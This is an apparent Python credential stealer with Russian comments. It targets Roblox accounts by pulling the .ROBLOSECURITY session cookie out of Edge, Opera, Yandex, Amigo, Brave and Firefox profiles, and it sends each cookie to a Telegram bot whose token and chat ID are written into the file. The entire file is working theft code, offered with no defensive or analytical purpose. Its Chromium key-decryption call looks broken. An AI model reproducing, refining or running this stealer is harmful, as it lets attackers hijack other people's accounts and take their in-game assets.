import os
import sqlite3
import json
import requests
from shutil import copy2
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Конфиг Telegram
TELEGRAM_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"  # Замените на реальный токен бота
CHAT_ID = "1962231620"       # Замените на реальный Chat ID

def decrypt_cookie(cookie, key):
    try:
        iv = cookie[3:15]
        payload = cookie[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(payload)[:-16].decode()
    except:
        return None

def get_chromium_cookies(browser_path):
    cookies = []
    try:
        # Копируем файлы для обхода блокировки
        temp_cookie = os.path.join(os.getenv("TEMP"), "temp_cookie")
        temp_local_state = os.path.join(os.getenv("TEMP"), "temp_local_state")
        copy2(os.path.join(browser_path, "Network", "Cookies"), temp_cookie)
        copy2(os.path.join(browser_path, "Local State"), temp_local_state)

        # Извлекаем ключ шифрования
        with open(temp_local_state, "r") as f:
            key = json.load(f)["os_crypt"]["encrypted_key"]
        key = default_backend().decrypt(key[5:], None)[:32]

        # Ищем куку .ROBLOSECURITY
        conn = sqlite3.connect(temp_cookie)
        cursor = conn.cursor()
        cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key='.roblox.com' AND name='.ROBLOSECURITY'")
        for name, encrypted_val in cursor.fetchall():
            decrypted = decrypt_cookie(encrypted_val, key)
            if decrypted: cookies.append(decrypted)

        conn.close()
        os.remove(temp_cookie)
        os.remove(temp_local_state)
    except Exception as e:
        pass
    return cookies

def get_firefox_cookies(path):
    try:
        # Копируем файл куки
        temp_db = os.path.join(os.getenv("TEMP"), "temp_cookies.sqlite")
        copy2(os.path.join(path, "cookies.sqlite"), temp_db)

        # Ищем куку
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM moz_cookies WHERE host='.roblox.com' AND name='.ROBLOSECURITY'")
        cookies = [row[0] for row in cursor.fetchall()]
        conn.close()
        os.remove(temp_db)
        return cookies
    except:
        return []

def send_to_telegram(cookie):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": f"ROBLOSECURITY: {cookie}"}
    requests.post(url, data=data, timeout=10)

def main():
    browsers = {
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
        "Amigo": os.path.join(os.getenv("LOCALAPPDATA"), "Amigo", "User Data", "Default"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    }

    all_cookies = []
    for name, path in browsers.items():
        if "Firefox" in name:
            for profile in os.listdir(path):
                if profile.endswith(".default-release"):
                    all_cookies.extend(get_firefox_cookies(os.path.join(path, profile)))
        elif os.path.exists(path):
            all_cookies.extend(get_chromium_cookies(path))

    # Отправляем уникальные куки
    for cookie in set(all_cookies):
        send_to_telegram(cookie)

if __name__ == "__main__":
    main()
